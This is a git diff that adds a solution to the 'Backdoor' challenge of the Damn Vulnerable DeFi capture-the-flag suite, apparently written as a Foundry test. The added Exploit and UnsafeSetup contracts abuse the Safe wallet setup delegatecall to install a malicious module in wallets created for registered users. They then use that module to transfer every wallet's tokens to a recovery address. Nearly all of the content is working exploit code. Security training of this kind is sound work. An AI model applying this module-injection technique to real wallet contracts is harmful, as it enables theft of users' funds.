@@ -7,6 +7,7 @@ import {Safe} from "@safe-global/safe-smart-account/contracts/Safe.sol";
 import {SafeProxyFactory} from "@safe-global/safe-smart-account/contracts/proxies/SafeProxyFactory.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
 import {WalletRegistry} from "../../src/backdoor/WalletRegistry.sol";
+import {Enum} from "@safe-global/safe-smart-account/contracts/common/Enum.sol";
 
 contract BackdoorChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -70,7 +71,7 @@ contract BackdoorChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_backdoor() public checkSolvedByPlayer {
-        
+        new Exploit(walletRegistry, users, recovery);
     }
 
     /**
@@ -92,5 +93,43 @@ contract BackdoorChallenge is Test {
 
         // Recovery account must own all tokens
         assertEq(token.balanceOf(recovery), AMOUNT_TOKENS_DISTRIBUTED);
+    }
+}
+
+contract Exploit {
+    constructor(WalletRegistry walletRegistry, address[] memory users, address recovery) {
+        UnsafeSetup unsafe = new UnsafeSetup();
+        bytes memory setupModule = abi.encodeWithSelector(unsafe.backdoor.selector, address(unsafe));
+
+        for (uint256 i = 0; i < users.length; i++) {
+            address[] memory _owners = new address[](1);
+            _owners[0] = users[i];
+            bytes memory initializer = abi.encodeWithSelector(
+                Safe.setup.selector, _owners, 1, address(unsafe), setupModule, address(0), address(0), 0, address(0)
+            );
+
+            Safe safe = Safe(
+                payable(
+                    SafeProxyFactory(walletRegistry.walletFactory()).createProxyWithCallback(
+                        walletRegistry.singletonCopy(), initializer, 0, walletRegistry
+                    )
+                )
+            );
+
+            unsafe.recover(DamnValuableToken(address(walletRegistry.token())), recovery, safe);
+        }
+    }
+}
+
+contract UnsafeSetup is Safe {
+    function backdoor(address module) external {
+        modules[module] = address(1);
+    }
+
+    function recover(DamnValuableToken token, address recovery, Safe safe) external {
+        bytes memory transfer =
+            abi.encodeWithSelector(token.transfer.selector, recovery, token.balanceOf(address(safe)));
+        bool ok = safe.execTransactionFromModule(address(token), 0, transfer, Enum.Operation.Call);
+        require(ok, "transfer failed");
     }
 }
